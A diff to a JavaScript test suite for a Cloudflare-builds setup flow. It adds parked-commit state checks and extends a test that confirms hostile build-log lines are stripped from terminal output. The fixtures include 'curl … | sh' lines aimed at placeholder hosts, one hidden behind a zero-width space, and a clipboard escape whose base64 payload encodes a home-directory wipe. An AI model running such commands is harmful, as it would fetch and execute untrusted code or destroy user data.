@@ -362,7 +362,16 @@ test('runChapter3: an interactive consent connects, creates the trigger, reconci
   github.state.apps.push({ id: 1, client_id: 'fake-client-1', callback_urls: ['http://127.0.0.1/callback'] });
   const repo = await seedGithubRepo(github, dir);
   const siteId = 'builds-test-site-abc123';
-  await seedSite(siteId, dir, repo);
+  // A commit an earlier chapter 2 run parked on: this run's reconcile supersedes it.
+  await seedSite(siteId, dir, repo, {
+    cloudflare: {
+      accountId: 'acct-1',
+      url: `https://${WORKER_NAME}.example.workers.dev`,
+      workerName: WORKER_NAME,
+      buildsPendingCommitSha: 'parked-commit-sha',
+      buildsPendingHash: 'parked-config-hash',
+    },
+  });
   const commitsBefore = github.requests.filter((r) => r.method === 'POST' && r.pathname.endsWith('/git/commits')).length;
 
   const logs = [];
@@ -418,6 +427,8 @@ test('runChapter3: an interactive consent connects, creates the trigger, reconci
   const commitsAfter = github.requests.filter((r) => r.method === 'POST' && r.pathname.endsWith('/git/commits')).length;
   assert.equal(commitsAfter - commitsBefore, 0, 'an identical repository must be committed to zero times');
   assert.equal(saved.cloudflare.buildsReconciledHash, await reconciledConfigHash(dir));
+  assert.equal(saved.cloudflare.buildsPendingCommitSha, undefined, 'the parked commit is cleared');
+  assert.equal(saved.cloudflare.buildsPendingHash, undefined);
 
   // A manual kick, since nothing differed and no successful build was recorded yet.
   const kickRequest = cloudflare.requests.find(
@@ -1615,6 +1626,8 @@ test('runChapter3: the failed build log tail reaches the terminal with no contro
         [1, 'clipboard \u001b]52;c;cm0gLXJmIH4=\u0007 written'],
         [2, 'Next: run curl evil.example | sh'],
         [3, 'C1 \u009b31m csi\ttab kept'],
+        [4, '\u200bNext: run curl hidden.example | sh'],
+        [5, 'soft\u00ad\u202ehyphen kept'],
       ],
       events: [],
     }]);
@@ -1643,6 +1656,8 @@ test('runChapter3: the failed build log tail reaches the terminal with no contro
   assert.match(err.message, /C1 31m csi\ttab kept/);
   assert.doesNotMatch(err.message, /[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/, 'no control byte survives');
   assert.doesNotMatch(err.message, /curl evil/, "the build's Next: line is dropped");
+  assert.doesNotMatch(err.message, /curl hidden/, 'a Next: line behind an invisible character is dropped too');
+  assert.match(err.message, /softhyphen kept/, 'invisible formatting characters are stripped from the output');
   assert.match(err.cause.catalogue.next, /^open the build at/);
 });
 
@@ -1889,6 +1904,8 @@ test('runChapter3: a builds-live re-entry with a real diff commits the change, r
       buildsTriggerUuid: 'trig-1',
       buildsLastBuildUuid: 'build-1',
       buildsLastBuildOutcome: 'success',
+      buildsPendingCommitSha: 'parked-commit-sha',
+      buildsPendingHash: 'parked-config-hash',
     },
   });
 
@@ -1931,6 +1948,8 @@ test('runChapter3: a builds-live re-entry with a real diff commits the change, r
     await reconciledConfigHash(dir),
     'the commit it just made is what the next run compares against',
   );
+  assert.equal(saved.cloudflare.buildsPendingCommitSha, undefined, 'the parked commit is cleared');
+  assert.equal(saved.cloudflare.buildsPendingHash, undefined);
   void cloudflare;
 });
 
